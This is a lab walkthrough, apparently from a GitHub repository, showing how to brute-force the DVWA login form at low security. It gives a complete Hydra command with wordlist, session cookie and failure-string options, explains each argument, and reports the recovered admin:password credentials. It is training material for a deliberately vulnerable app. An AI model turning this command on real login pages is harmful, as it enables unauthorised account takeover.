## Brute Force – Security Level: Low

The first challenge of the **DVWA** application is to brute force the login form with the security level set to **low**.  
A **brute force attack** systematically tries all possible username and password combinations until the correct credentials are found.

<div align="center">
    <img src="https://github.com/j0wittmann/Attacking-DVWA/blob/main/vulnerabilities/brute-force/screenshots/login.png" alt="Brute Force login" width="700">
</div>

## Hydra
**Hydra** is a popular tool in **Kali Linux** for automating brute force attacks against services such as HTTP, SSH, and FTP.

Right-click the page and select **Inspect**, then go to the **Network** tab.  
Submit any username and password to view the HTTP request and identify the correct URL structure.

<div align="center">
    <img src="https://github.com/j0wittmann/Attacking-DVWA/blob/main/vulnerabilities/brute-force/screenshots/http-request.png" alt="Brute Force login" width="900">
</div>

The following command can be used to run the attack:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.16.99.128 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID=4dvhkqpuq8fflvij9dqin7tgh1:F=Username and/or password incorrect."
```
Let's break down the command:
- `-l admin`  
  Specifies the username to test (`admin` in this case).

- `-P /usr/share/wordlists/rockyou.txt`  
  Provides the path to the password list Hydra will iterate through.

- `172.16.99.128`  
  The IP address of the target machine running DVWA (can be different in your setup!)

- `http-get-form`  
  The screenshot above shows that the HTTP request uses the GET method.

- `"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login"`  
  Sets the form parameters. `^USER^` is always `admin`, and `^PASS^` is replaced with each password from the list.

- `H=Cookie:security=low;PHPSESSID=4dvhkqpuq8fflvij9dqin7tgh1`  
  Sends the session cookie with the request. This includes the DVWA security level (`low`) and the current session ID (`PHPSESSID`), which must match your active login session in the browser.  
  Get the cookie by right-clicking the page and selecting **Inspect**, then go to the **Network** tab.  
  Check the request headers or open the **Cookies** tab to find the session cookie.
  <div align="center">
    <img src="https://github.com/j0wittmann/Attacking-DVWA/blob/main/vulnerabilities/brute-force/screenshots/get-cookie.png" alt="Brute Force login" width="900">
</div>

- `F=Username and/or password incorrect.`  
  The failure string. If this message appears in the response, Hydra knows the login attempt was unsuccessful. If it does **not** appear, the attempt is assumed to be successful.

<div align="center">
    <img src="https://github.com/j0wittmann/Attacking-DVWA/blob/main/vulnerabilities/brute-force/screenshots/successful-brute-force.png" alt="Brute Force login" width="900">
</div>

Hydra successfully found the credentials: **admin:password**

<div align="center">
    <img src="https://github.com/j0wittmann/Attacking-DVWA/blob/main/vulnerabilities/brute-force/screenshots/successful-login.png" alt="Brute Force login" width="700">
</div>

---
